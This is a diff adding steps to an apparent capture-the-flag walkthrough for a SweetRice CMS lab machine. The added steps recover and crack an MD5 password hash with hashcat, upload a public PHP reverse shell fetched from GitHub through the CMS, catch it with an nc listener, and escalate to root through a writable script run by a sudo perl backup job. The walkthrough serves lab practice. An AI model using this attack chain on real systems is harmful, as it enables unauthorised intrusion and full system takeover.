@@ -63,7 +63,8 @@ lets get the mysql backup file
 
 in this file we can find credentials
 
-name: **manager**
+user: **manager**
+
 passwordhash: **42f749ade7f9e195bf475f37a44cafcb**
 
 ## _step 5
@@ -72,7 +73,49 @@ lets crack the **md5** passwordhash with hashcat
 
 ***hashcat -m 0 `yourfile.txt` /usr/share/wordlists/rockyou.txt***
 
+user: **manager**
+
+password: **Password123**
+
 ## _step 6
+
+sweetrice login 
+
+---->***http://`host-ip`/content/as/***
+
+## _step 7
+
+upload php reverse shell from https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+
+set up listener on your machine:
+
+***nc -lnvp `PORT`***
+
+run uploaded shell to get connection:
+
+---->***http://`host-ip`/content/inc/ads/`SHELLNAME`***
+
+improve your shell with following command:
+
+***python3 -c 'import pty;pty.spawn("/bin/bash")'***
+
+the user flag is located in: 
+
+----->***/home/itguy/flag.txt***
+
+
+## _step 8 
+
+privilege escaltion to root:
+
+run ***echo "/bin/bash" > /etc/copy.sh***
+
+and ***sudo /usr/bin/perl /home/itguy/backup.pl***
+
+the root flag is located in:
+
+----->***/root/root.txt***
+
 
 
 
